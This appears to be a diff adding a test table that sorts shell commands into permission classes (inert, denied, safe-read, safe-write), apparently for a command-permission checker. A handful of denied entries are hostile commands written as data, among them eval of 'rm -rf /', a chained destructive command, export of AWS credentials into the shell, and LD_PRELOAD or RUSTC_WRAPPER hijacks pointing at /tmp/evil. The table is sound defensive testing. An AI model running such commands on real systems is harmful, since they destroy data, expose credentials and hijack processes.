+esptool.py version -h	inert
+esptool.py version x	inert
+esptool.py write_flash	denied
+esptool.py write_flash x	denied
+esptool.py write_flash_status	denied
+esptool.py write_flash_status x	denied
+esptool.py write_mem	denied
+esptool.py write_mem x	denied
+esptool.py x	denied
+eval	denied
+eval "$(! mise activate bash)"	denied
+eval "$(( 1 + 2 ))"	denied
+eval "$(FOO=bar mise activate bash)"	denied
+eval "$(atuin init --help)"	denied
+eval "$(atuin init bash --disable-ai=$VAR)"	denied
+eval "$(atuin init bash)"	inert
+eval "$(atuin init fish --disable-ai)"	inert
+eval "$(atuin init zsh --disable-ctrl-r --disable-up-arrow)"	inert
+eval "$(atuin search foo)"	denied
+eval "$(aws configure export-credentials --format env)"	denied
+eval "$(aws configure export-credentials --format json)"	denied
+eval "$(aws configure list)"	denied
+eval "$(conda list)"	denied
+eval "$(conda shell.bash activate myenv)"	denied
+eval "$(conda shell.bash hook --dev)"	denied
+eval "$(conda shell.bash hook)"	inert
+eval "$(conda shell.bash)"	denied
+eval "$(conda shell.fish hook)"	inert
+eval "$(conda shell.zsh hook)"	inert
+eval "$(direnv export bash)"	denied
+eval "$(direnv hook $SHELL)"	denied
+eval "$(direnv hook --help)"	denied
+eval "$(direnv hook bash)"	inert
+eval "$(direnv hook fish)"	inert
+eval "$(direnv hook zsh)"	inert
+eval "$(direnv status)"	denied
+eval "$(echo foo)""$(echo bar)"	denied
+eval "$(echo hello)"	denied
+eval "$(fnm current)"	denied
+eval "$(fnm env --help)"	denied
+eval "$(fnm env --json)"	denied
+eval "$(fnm env --shell $SHELL)"	denied
+eval "$(fnm env --shell bash --use-on-cd)"	inert
+eval "$(fnm env --use-on-cd)"	inert
+eval "$(fnm env)"	inert
+eval "$(fzf --bash)"	inert
+eval "$(fzf --fish)"	inert
+eval "$(fzf --help)"	denied
+eval "$(fzf --multi)"	denied
+eval "$(fzf --nushell)"	inert
+eval "$(fzf --zsh)"	inert
+eval "$(fzf)"	denied
+eval "$(goenv init - $SHELL)"	denied
+eval "$(goenv init - --help)"	denied
+eval "$(goenv init - bash)"	inert
+eval "$(goenv init - zsh --no-rehash)"	inert
+eval "$(goenv init -)"	inert
+eval "$(goenv init bash)"	denied
+eval "$(mamba info)"	denied
+eval "$(mamba list)"	denied
+eval "$(mamba shell activate myenv)"	denied
+eval "$(mamba shell hook --help)"	denied
+eval "$(mamba shell hook --shell $SHELL)"	denied
+eval "$(mamba shell hook --shell bash)"	inert
+eval "$(mamba shell hook --shell fish)"	inert
+eval "$(mamba shell hook -s zsh)"	inert
+eval "$(mise activate "$VAR")"	denied
+eval "$(mise activate $1)"	denied
+eval "$(mise activate $@)"	denied
+eval "$(mise activate $SHELL)"	denied
+eval "$(mise activate $VAR)"	denied
+eval "$(mise activate ${VAR})"	denied
+eval "$(mise activate '$VAR')"	denied
+eval "$(mise activate *)"	denied
+eval "$(mise activate --help)"	denied
+eval "$(mise activate -h)"	denied
+eval "$(mise activate /bin/zsh --quiet)"	inert
+eval "$(mise activate ?)"	denied
+eval "$(mise activate [bz]ash)"	denied
+eval "$(mise activate bash &)"	denied
+eval "$(mise activate bash --shims)"	inert
+eval "$(mise activate bash --shims=$VAR)"	denied
+eval "$(mise activate bash 2>&1)"	inert
+eval "$(mise activate bash 2>/dev/null)"	inert
+eval "$(mise activate bash > $(evil))"	denied
+eval "$(mise activate bash > /dev/null)"	inert
+eval "$(mise activate bash > evil)"	denied
+eval "$(mise activate bash | cat)"	denied
+eval "$(mise activate bash) ; rm -rf /"	denied
+eval "$(mise activate bash)"	inert
+eval "$(mise activate bash)" "$(mise activate zsh)"	inert
+eval "$(mise activate {bash,zsh})"	denied
+eval "$(mise activate ~)"	denied
+eval "$(mise config get foo)"	denied
+eval "$(mise list)"	denied
+eval "$(mise)"	denied
+eval "$(nodenv init - $SHELL)"	denied
+eval "$(nodenv init - --help)"	denied
+eval "$(nodenv init - bash)"	inert
+eval "$(nodenv init - zsh --no-rehash)"	inert
+eval "$(nodenv init -)"	inert
+eval "$(nodenv init bash)"	denied
+eval "$(pyenv init - $SHELL)"	denied
+eval "$(pyenv init - --help)"	denied
+eval "$(pyenv init - bash)"	inert
+eval "$(pyenv init -)"	inert
+eval "$(pyenv init --install)"	denied
+eval "$(pyenv init --path zsh --no-rehash)"	inert
+eval "$(pyenv init bash)"	denied
+eval "$(rbenv init - $SHELL)"	denied
+eval "$(rbenv init - --help)"	denied
+eval "$(rbenv init - bash)"	inert
+eval "$(rbenv init - zsh --no-rehash)"	inert
+eval "$(rbenv init -)"	inert
+eval "$(rbenv init bash)"	denied
+eval "$(rm -rf /)"	denied
+eval "$(ssh-agent --help)"	denied
+eval "$(ssh-agent -D)"	denied
+eval "$(ssh-agent -a /tmp/sock)"	denied
+eval "$(ssh-agent -d)"	denied
+eval "$(ssh-agent -s -k)"	safe-read
+eval "$(ssh-agent -s)"	safe-read
+eval "$(ssh-agent)"	safe-read
+eval "$(starship init --help)"	denied
+eval "$(starship init bash --print-full-init=$VAR)"	denied
+eval "$(starship init bash)"	inert
+eval "$(starship init fish --print-full-init)"	inert
+eval "$(starship init zsh)"	inert
+eval "$(starship prompt)"	denied
+eval "$(zoxide init $SHELL)"	denied
+eval "$(zoxide init --help)"	denied
+eval "$(zoxide init bash)"	inert
+eval "$(zoxide init fish --no-aliases)"	inert
+eval "$(zoxide init zsh --no-cmd)"	inert
+eval "$(zoxide query foo)"	denied
+eval "echo $(mise activate bash)"	denied
+eval "echo hello"	denied
+eval "prefix $(mise activate bash) suffix"	denied
+eval $(mise activate bash)	inert
+eval $VAR	denied
+eval 'git log'	denied
+eval 'rm -rf /'	denied
+eval <(mise activate bash)	denied
+eval `mise activate bash`	inert
+ex	inert
+ex --clean	inert
+ex --clean --help	inert
+ex --clean -T x	inert
+ex --clean x	inert
+ex --help	inert
+ex --log	inert
+ex --noplugin	inert
+ex --not-a-term	inert
+ex --startuptime	inert
+ex --ttyfail	inert
+ex --version	inert
+ex -C	inert
+ex -D	inert
+ex -L	inert
+ex -M	inert
+ex -N	inert
+ex -R	inert
+ex -T x	inert
+ex -Z	inert
+ex -b	inert
+ex -d	inert
+ex -h	inert
+ex -i x	inert
+ex -l	inert
+ex -m	inert
+ex -n	inert
+ex -q x	inert
+ex -r	inert
+ex -t x	inert
+ex -v	inert
+ex -x	inert
+ex -y	inert
+ex x	inert
+exa	inert
+exa --accessed	inert
+exa --accessed --all	inert
+exa --accessed --color x	inert
+exa --accessed x	inert
+exa --all	inert
+exa --binary	inert
+exa --blocks	inert
+exa --blocksize	inert
+exa --bytes	inert
+exa --changed	inert
+exa --classify	inert
+exa --color x	inert
+exa --color-scale	inert
+exa --color-scale-mode	inert
+exa --colour x	inert
+exa --context	inert
+exa --created	inert
+exa --dereference	inert
+exa --extended	inert
+exa --flags	inert
+exa --follow-symlinks	inert
+exa --git	inert
+exa --git-ignore	inert
+exa --git-ignore-glob x	inert
+exa --git-repos	inert
+exa --git-repos-no-status	inert
+exa --grid-columns x	inert
+exa --group	inert
+exa --group-directories-first	inert
+exa --group-directories-first-dirs x	inert
+exa --header	inert
+exa --help	inert
+exa --hyperlink	inert
+exa --icons	inert
+exa --ignore-glob x	inert
+exa --inode	inert
+exa --level x	inert
+exa --links	inert
+exa --list-dirs	inert
+exa --long	inert
+exa --modified	inert
+exa --mounts	inert
+exa --no-filesize	inert
+exa --no-git	inert
+exa --no-icons	inert
+exa --no-permissions	inert
+exa --no-quotes	inert
+exa --no-time	inert
+exa --no-user	inert
+exa --numeric	inert
+exa --octal-permissions	inert
+exa --oneline	inert
+exa --only-dirs	inert
+exa --only-files	inert
+exa --recurse	inert
+exa --reverse	inert
+exa --smart-group x	inert
+exa --sort x	inert
+exa --time x	inert
+exa --time-style x	inert
+exa --total-size x	inert
+exa --tree	inert
+exa --version	inert
+exa --width x	inert
+exa -1	inert
+exa -@	inert
+exa -A	inert
+exa -B	inert
+exa -D	inert
+exa -F	inert
+exa -G	inert
+exa -H	inert
+exa -I	inert
+exa -L x	inert
+exa -M	inert
+exa -R	inert
+exa -S	inert
+exa -T	inert
+exa -U	inert
+exa -V	inert
+exa -X x	inert
+exa -Z	inert
+exa -a	inert
+exa -b	inert
+exa -d	inert
+exa -f	inert
+exa -g	inert
+exa -h	inert
+exa -i	inert
+exa -l	inert
+exa -m	inert
+exa -r	inert
+exa -s	inert
+exa -t x	inert
+exa -u	inert
+exa -w x	inert
+exa -x	inert
+exa x	inert
+exiftool	denied
+exiftool --help	safe-read
+exiftool --help -@ x	safe-read
+exiftool --help -G	safe-read
+exiftool --help x	safe-read
+exiftool --version	denied
+exiftool -@ x	safe-read
+exiftool -G	safe-read
+exiftool -S	safe-read
+exiftool -T	safe-read
+exiftool -V	safe-read
+exiftool -X	safe-read
+exiftool -XML x	safe-read
+exiftool -a	safe-read
+exiftool -args	safe-read
+exiftool -b	safe-read
+exiftool -binary	safe-read
+exiftool -c	safe-read
+exiftool -config x	safe-read
+exiftool -coordFormat	safe-read
+exiftool -csv	safe-read
+exiftool -csv+ x	safe-read
+exiftool -csvDelim x	safe-read
+exiftool -d	safe-read
+exiftool -d x	safe-read
+exiftool -dateFormat	safe-read
+exiftool -dateFormat x	safe-read
+exiftool -deleteByName	safe-read
+exiftool -deletegps	safe-read
+exiftool -duplicates	safe-read
+exiftool -e	safe-read
+exiftool -execute x	safe-read
+exiftool -ext x	safe-read
+exiftool -extracted	safe-read
+exiftool -f	safe-read
+exiftool -fast	safe-read
+exiftool -fast2	safe-read
+exiftool -fast4	safe-read
+exiftool -fileOrder	safe-read
+exiftool -fileOrder x	safe-read
+exiftool -geosync x	safe-read
+exiftool -geotag x	safe-read
+exiftool -globalTimeShift x	safe-read
+exiftool -h	safe-read
+exiftool -htmlDump	safe-read
+exiftool -htmlDump x	safe-read
+exiftool -i	safe-read
+exiftool -i x	safe-read
+exiftool -if x	safe-read
+exiftool -ifd0	safe-read
+exiftool -ignore	safe-read
+exiftool -j	safe-read
+exiftool -json	safe-read
+exiftool -l	safe-read
+exiftool -lang	safe-read
+exiftool -lang x	safe-read
+exiftool -list	safe-read
+exiftool -listf	safe-read
+exiftool -listg	safe-read
+exiftool -listr	safe-read
+exiftool -listr x	safe-read
+exiftool -m	safe-read
+exiftool -n	safe-read
+exiftool -overwrite_original	safe-write
+exiftool -overwrite_original_in_place	safe-write
+exiftool -php	safe-read
+exiftool -progress	safe-read
+exiftool -progress x	safe-read
+exiftool -progressOptions x	safe-read
+exiftool -psum	safe-read
+exiftool -q	safe-read
+exiftool -q x	safe-read
+exiftool -quiet	safe-read
+exiftool -r	safe-read
+exiftool -r x	safe-read
+exiftool -recurse	safe-read
+exiftool -sep	safe-read
+exiftool -short	safe-read
+exiftool -srcfile	safe-read
+exiftool -srcfile x	safe-read
+exiftool -stay_open	safe-read
+exiftool -struct	safe-read
+exiftool -tab	safe-read
+exiftool -tab x	safe-read
+exiftool -tagsFromFile	safe-read
+exiftool -textOut	safe-read
+exiftool -textOut x	safe-read
+exiftool -u	safe-read
+exiftool -unknown	safe-read
+exiftool -unknown2	safe-read
+exiftool -v	safe-read
+exiftool -verbose	safe-read
+exiftool -version	safe-read
+exiftool -w	safe-read
+exiftool -w x	safe-read
+exiftool -wext	safe-read
+exiftool -wext x	safe-read
+exiftool -x x	safe-read
+exiftool -xmlFormat	safe-read
+exiftool -xmlFormat x	safe-read
+exiftool -xmp	safe-read
+exiftool -z	safe-read
+exiftool x	safe-read
+exit	inert
+exit --help	denied
+exit --version	denied
+exit 0	inert
+exit 1	inert
+exit x	inert
+exo	denied
+exo --account x	denied
+exo --help	inert
+exo --help --account x	inert
+exo --help --quiet	inert
+exo --help x	denied
+exo --output-format x	denied
+exo --output-template x	denied
+exo --quiet	denied
+exo --version	denied
+exo -O x	denied
+exo -h	inert
+exo -q	denied
+exo compute	denied
+exo compute elastic-ip	denied
+exo compute elastic-ip --help	inert
+exo compute elastic-ip --help -h	denied
+exo compute elastic-ip --help x	denied
+exo compute elastic-ip -h	inert
+exo compute elastic-ip list	inert
+exo compute elastic-ip list --help	inert
+exo compute elastic-ip show	inert
+exo compute elastic-ip show --help	inert
+exo compute elastic-ip x	denied
+exo compute instance	denied
+exo compute instance --help	inert
+exo compute instance --help -h	denied
+exo compute instance --help x	denied
+exo compute instance -h	inert
+exo compute instance list	inert
+exo compute instance list --help	inert
+exo compute instance show	inert
+exo compute instance show --help	inert
+exo compute instance x	denied
+exo compute instance-type	denied
+exo compute instance-type --help	inert
+exo compute instance-type --help -h	denied
+exo compute instance-type --help x	denied
+exo compute instance-type -h	inert
+exo compute instance-type list	inert
+exo compute instance-type list --help	inert
+exo compute instance-type show	inert
+exo compute instance-type show --help	inert
+exo compute instance-type x	denied
+exo compute security-group	denied
+exo compute security-group --help	inert
+exo compute security-group --help -h	denied
+exo compute security-group --help x	denied
+exo compute security-group -h	inert
+exo compute security-group list	inert
+exo compute security-group list --help	inert
+exo compute security-group show	inert
+exo compute security-group show --help	inert
+exo compute security-group x	denied
+exo compute ssh-key	denied
+exo compute ssh-key --help	inert
+exo compute ssh-key --help -h	denied
+exo compute ssh-key --help x	denied
+exo compute ssh-key -h	inert
+exo compute ssh-key list	inert
+exo compute ssh-key list --help	inert
+exo compute ssh-key show	inert
+exo compute ssh-key show --help	inert
+exo compute ssh-key x	denied
+exo compute x	denied
+exo config	denied
+exo config list	inert
+exo config list --help	inert
+exo config list --help -h	inert
+exo config list --help x	inert
+exo config list -h	inert
+exo config list x	inert
+exo config show	inert
+exo config show --help	inert
+exo config show --help -h	inert
+exo config show --help x	inert
+exo config show -h	inert
+exo config show x	inert
+exo config x	denied
+exo dbaas	denied
+exo dbaas list	inert
+exo dbaas list --help	inert
+exo dbaas list --help -h	inert
+exo dbaas list --help x	inert
+exo dbaas list -h	inert
+exo dbaas list x	inert
+exo dbaas show	denied
+exo dbaas show --help	inert
+exo dbaas show --help -h	inert
+exo dbaas show --help x	inert
+exo dbaas show -h	inert
+exo dbaas show x	inert
+exo dbaas type	denied
+exo dbaas type --help	inert
+exo dbaas type --help -h	denied
+exo dbaas type --help x	denied
+exo dbaas type -h	inert
+exo dbaas type list	inert
+exo dbaas type list --help	inert
+exo dbaas type x	denied
+exo dbaas x	denied
+exo dns	denied
+exo dns list	inert
+exo dns list --help	inert
+exo dns list --help -h	inert
+exo dns list --help x	inert
+exo dns list -h	inert
+exo dns list x	inert
+exo dns show	denied
+exo dns show --help	inert
+exo dns show --help -h	inert
+exo dns show --help x	inert
+exo dns show -h	inert
+exo dns show x	inert
+exo dns x	denied
+exo limits	inert
+exo limits x	inert
+exo status	inert
+exo status x	inert
+exo version	inert
+exo version x	inert
+exo x	denied
+exo zone	inert
+exo zone x	inert
+expand	inert
+expand --help	inert
+expand --help --initial	inert
+expand --help --tabs x	inert
+expand --help x	inert
+expand --initial	inert
+expand --tabs x	inert
+expand --version	inert
+expand -V	inert
+expand -h	inert
+expand -i	inert
+expand -t x	inert
+expand file.txt	inert
+expand x	inert
+expect	denied
+expect --help	inert
+expect --help --version	inert
+expect --help x	denied
+expect --version	inert
+expect -h	inert
+expect -v	inert
+expect x	denied
+expo	denied
+expo --help	inert
+expo --help --version	denied
+expo --help x	denied
+expo --version	inert
+expo -h	inert
+expo -v	inert
+expo add	denied
+expo add x	denied
+expo client:install:android	denied
+expo client:install:android x	denied
+expo client:install:ios	denied
+expo client:install:ios x	denied
+expo config	safe-read
+expo config --full	safe-read
+expo config --full --help	safe-read
+expo config --full --type x	safe-read
+expo config --full x	safe-read
+expo config --help	safe-read
+expo config --type x	safe-read
+expo config -h	safe-read
+expo config x	safe-read
+expo customize	denied
+expo customize x	denied
+expo doctor	safe-read
+expo doctor --fix-dependencies	safe-read
+expo doctor --fix-dependencies --help	safe-read
+expo doctor --fix-dependencies x	safe-read
+expo doctor --help	safe-read
+expo doctor --offline	safe-read
+expo doctor --verbose	safe-read
+expo doctor -h	safe-read
+expo doctor x	safe-read
+expo export	denied
+expo export x	denied
+expo export:embed	denied
+expo export:embed x	denied
+expo help	inert
+expo help x	inert
+expo init	denied
+expo init x	denied
+expo install	denied
+expo install x	denied
+expo login	denied
+expo login x	denied
+expo logout	denied
+expo logout x	denied
+expo metro-config	denied
+expo metro-config x	denied
+expo module	denied
+expo module x	denied
+expo prebuild	denied
+expo prebuild x	denied
+expo register	denied
+expo register x	denied
+expo run	denied
+expo run x	denied
+expo run:android	denied
+expo run:android x	denied
+expo run:ios	denied
+expo run:ios x	denied
+expo start	denied
+expo start x	denied
+expo whoami	safe-read
+expo whoami --help	safe-read
+expo whoami --help -h	safe-read
+expo whoami --help x	safe-read
+expo whoami -h	safe-read
+expo whoami x	safe-read
+expo x	denied
+export	inert
+export --help	denied
+export --version	denied
+export -f	inert
+export -f -n	inert
+export -f x	inert
+export -n	inert
+export -p	inert
+export FOO=bar	inert
+export GIT_DIR=/tmp/evil	denied
+export LD_PRELOAD=/tmp/evil.so	denied
+export PATH_EXTRA=./bin	inert
+export RUSTC_WRAPPER=/tmp/evil	denied
+export x	inert
+expr	denied
+expr --help	inert
+expr --version	inert
+expr 1 + 2	inert
+expr x	inert
+eyapp	denied
+eyapp --help	denied
+eyapp --version	denied
+eyapp -B x	safe-write
+eyapp -C x	safe-write
+eyapp -N	safe-write
+eyapp -N -B x	safe-write
+eyapp -N -T	safe-write
+eyapp -N x	safe-write
+eyapp -T	safe-write
+eyapp -V	safe-write
+eyapp -b x	safe-write
+eyapp -c x	safe-write
+eyapp -h	safe-write
+eyapp -l	safe-write
+eyapp -m x	safe-write
+eyapp -n	safe-write
+eyapp -o x	safe-write
+eyapp -s	safe-write
+eyapp -t x	safe-write
+eyapp -v	safe-write
+eyapp grammar.eyp	safe-write
+eyapp x	safe-write
+eza	inert
+eza --accessed	inert
+eza --accessed --all	inert
+eza --accessed --color x	inert
+eza --accessed x	inert
+eza --all	inert
+eza --binary	inert
+eza --blocks	inert
+eza --blocksize	inert
+eza --bytes	inert
+eza --changed	inert
+eza --classify	inert
+eza --color x	inert
+eza --color-scale	inert
+eza --color-scale-mode	inert
+eza --colour x	inert
+eza --context	inert
+eza --created	inert
+eza --dereference	inert
+eza --extended	inert
+eza --flags	inert
+eza --follow-symlinks	inert
+eza --git	inert
+eza --git-ignore	inert
+eza --git-ignore-glob x	inert
+eza --git-repos	inert
+eza --git-repos-no-status	inert
+eza --grid-columns x	inert
+eza --group	inert
+eza --group-directories-first	inert
+eza --group-directories-first-dirs x	inert
+eza --header	inert
+eza --help	inert
+eza --hyperlink	inert
+eza --icons	inert
+eza --ignore-glob x	inert
+eza --inode	inert
+eza --level x	inert
+eza --links	inert
+eza --list-dirs	inert
+eza --long	inert
+eza --modified	inert
+eza --mounts	inert
+eza --no-filesize	inert
+eza --no-git	inert
+eza --no-icons	inert
+eza --no-permissions	inert
+eza --no-quotes	inert
+eza --no-time	inert
+eza --no-user	inert
+eza --numeric	inert
+eza --octal-permissions	inert
+eza --oneline	inert
+eza --only-dirs	inert
+eza --only-files	inert
+eza --recurse	inert
+eza --reverse	inert
+eza --smart-group x	inert
+eza --sort x	inert
+eza --time x	inert
+eza --time-style x	inert
+eza --total-size x	inert
+eza --tree	inert
+eza --version	inert
+eza --width x	inert
+eza -1	inert
+eza -@	inert
+eza -A	inert
+eza -B	inert
+eza -D	inert
+eza -F	inert
+eza -G	inert
+eza -H	inert
+eza -I	inert
+eza -L x	inert
+eza -M	inert
+eza -R	inert
+eza -S	inert
+eza -T	inert
+eza -U	inert
+eza -V	inert
+eza -X x	inert
+eza -Z	inert
+eza -a	inert
+eza -b	inert
+eza -d	inert
+eza -f	inert
+eza -g	inert
+eza -h	inert
+eza -i	inert
+eza -l	inert
+eza -m	inert
+eza -r	inert
+eza -s	inert
+eza -t x	inert
+eza -u	inert
+eza -w x	inert
+eza -x	inert
+eza x	inert
